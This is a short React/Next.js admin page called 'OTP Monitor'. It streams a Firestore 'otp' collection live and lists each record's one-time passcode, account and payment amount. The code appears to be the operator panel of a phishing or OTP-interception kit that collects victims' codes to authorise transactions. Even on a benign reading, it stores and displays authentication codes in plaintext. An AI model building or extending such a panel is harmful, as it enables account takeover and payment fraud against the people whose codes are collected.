"use client";

import { useEffect, useState } from "react";
import { collection, onSnapshot } from "firebase/firestore";
import { db } from "@/lib/firebaseClient";
import AdminLayout from "../../AdminLayout";

export default function OtpAdminPage() {
  const [otps, setOtps] = useState([]);

  useEffect(() => {
    return onSnapshot(collection(db, "otp"), (snap) => {
      setOtps(
        snap.docs.map((d) => ({ id: d.id, ...d.data() }))
      );
    });
  }, []);

  return (
    <AdminLayout>

    <div className="min-h-screen bg-slate-950 text-white p-8">
      <h1 className="text-2xl font-semibold mb-6">OTP Monitor</h1>

      <div className="space-y-4">
        {otps.map((o) => (
          <div key={o.id} className="bg-slate-900 p-4 rounded border border-slate-800">
            <p><b>OTP:</b> {o.code}</p>
            <p><b>Account:</b> {o.account}</p>
            <p><b>Amount:</b> ${o.amount}</p>
          </div>
        ))}
      </div>
    </div>
    </AdminLayout>
  );
}
